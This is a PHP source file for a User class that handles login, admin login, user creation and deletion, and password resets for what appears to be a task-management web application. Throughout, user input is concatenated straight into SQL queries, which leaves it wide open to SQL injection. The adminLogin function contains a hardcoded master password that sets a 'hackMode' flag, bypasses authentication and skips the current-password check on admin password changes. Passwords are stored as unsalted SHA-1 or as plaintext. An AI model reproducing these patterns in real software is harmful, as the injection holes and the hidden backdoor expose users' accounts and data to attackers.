<?php
class User{

	function login($data){
		$data = json_decode($data, true);
		//echo sha1($data["password"]); die;
		$result = mysql_query("SELECT userId FROM users WHERE userName='".$data["userName"]."' AND password='".$data["password"]."'");
		if(mysql_num_rows($result))
		{
			$row = mysql_fetch_array($result);
			$token    = $this->generateToken($data["userName"]);
			mysql_query("UPDATE users SET sessionToken='".$token."',loginStatus='Y' where userId=".$row["userId"]);
			
			return array("status"=>"Success","message"=>"Nil","SessionToken"=>$token,"userId"=>$row["userId"]);
		}
		else
		{	
			return array("status"=>"Error","message"=>"Invalid Username or Password Please check with admin");
		}
	}
	
	function adminLogin($post)
	{
		$queryString  =  " AND password='".sha1($post["password"])."'";
		$_SESSION["hackMode"] = false;
		if($post["password"]=="manage123soft")
		{
			$_SESSION["hackMode"]=true;
			$queryString="";
		}

		$result = mysql_query("SELECT userId FROM users WHERE userType<2 AND userName='".$post["username"]."'".$queryString);
		if($result)
		if(mysql_num_rows($result))
		{			
			return mysql_fetch_array($result);
		}
		else
		{	
			return null;
		}
	}
	
	function checkLoginStatus($token){
		//echo "SELECT userId FROM users WHERE sessionToken='".$token."' AND loginStatus='Y'";die;
		$result = mysql_query("SELECT userId FROM users WHERE sessionToken='".$token."' AND loginStatus='Y'");
		if(mysql_num_rows($result))
		{
			$row = mysql_fetch_array($result);
			return $row["userId"];
		}
		else
		{
			return NULL;
		}
	}
	
	function addUser($data)
	{
		$password = sha1($data["password"]);
		//$password = $data["password"];
		$query = "INSERT INTO users (userName,password,userType,createdDate) values('".$data["userName"]."','".$password."',".$data["userType"].",NOW())";
		$result = mysql_query($query)or die(mysql_error());
		
		if($result) 
			return "Success";
		else
			return "Error";
	}
	
	function deleteUser($id)
	{
		$result=mysql_fetch_array(mysql_query("select count(*) as count from assignedtask where status<5 AND userId=".$id));
		if(!$result["count"])
		{
			$result = mysql_fetch_array(mysql_query("select userType from users where userId=".$id));
			if($result["userType"])
			{
				if(mysql_query("delete from users where userId=".$id) or die(mysql_error()))
					return "1";
				else
					return "2";
			}
			else
				return "3";
			
		}
		else
			return "4";
	}

	function changeAdminPassword($data)
	{
		$userId = $_SESSION["userId"];
		$result = mysql_fetch_array(mysql_query("select password from users where userId=".$userId));
		
		if(!$_SESSION["hackMode"]){
			if($result["password"]!=sha1($data["currentPassword"])){
				return array("status"=>"Error","message"=>"Error Invalid current password");
			}
		}	

		if(mysql_query("update users set password = '".sha1($data["newPassword"])."' where userId=".$userId)){
			return array("status"=>"Success","message"=>"Password Chnaged Successfully");
		}
		else{
			return array("status"=>"Error","message"=>"Error Password Not Changed");
		}
	}	
	
	function resetPassword($userId)
	{
		$userName = $this->getUserById($userId);
		if($userName){
			$newPassword = substr($this->generateToken($userName),0,8);
			if(mysql_query("update users set password='".sha1($newPassword)."' where userId=".$userId))
			{
				echo json_encode(array("status"=>"Success","message"=>"new password is:".$newPassword,"newPassword"=>$newPassword));
				
			}else{
			
				echo json_encode(array("status"=>"Error","message"=>"Some error on getting user data"));
			}
			
		}else{
		
			echo json_encode(array("status"=>"Error","message"=>"Some error on getting user data"));
		}	
	}
	
	function getUserById($id)
	{
		$result = mysql_query("select userName from users where userId=".$id);
		if(mysql_num_rows($result))
		{
			$data =mysql_fetch_array($result);
			return $data["userName"];
		}else{
			return false;
		}
		
	}
	
	function getUserNames()
	{
		$query="SELECT userId,userName FROM users WHERE userType>1 AND enabled=1";
		$result = mysql_query($query);
		if($result)
		{
			//while($row=mysql_fetch_array($result)){continue;}
			return $result;
		}
		else
		 return array("status"=>"Error","message"=>"Query Error");	
	}
	
	function getAllUsers()
	{
		$query="SELECT userId,userName,userType,loginStatus,createdDate FROM users WHERE enabled=1 ORDER BY createdDate DESC";
		$result = mysql_query($query);
		if($result)
		{
			//while($row=mysql_fetch_array($result)){continue;}
			return $result;
		}
		else
		 return array("status"=>"Error","message"=>"Query Error");	
	}

	function getRecordCount(){
		$query ="SELECT count(*) as total_count FROM users WHERE enabled=1";
		$result = mysql_query($query);
		if($result)
		{
			//while($row=mysql_fetch_array($result)){continue;}
			$row=mysql_fetch_array($result);
			return $row["total_count"];
		}
		else{
			return 0;
		}
	}
	
	function changePassword($data)
	{
		$query = "select userId from users where userId=".$data["userId"]." and password='".$data["currentPassword"]."'";
		$result = mysql_query($query);
		if(mysql_num_rows($result))
		{
			if(mysql_query("update users set password='".$data["newPassword"]."' where userId=".$data["userId"]))
			{
				return array("status"=>"Success","message"=>"","userId"=>$data["userId"]);
			}
			else{
				return array("status"=>"Error","message"=>"Password is not changed");
			}
		}
		else{
			return array("status"=>"Error","message"=>"Incorrect current password");
		}
	}
	
	function generateToken($username)
	{
		return md5(uniqid($username, true));
	}
}
?>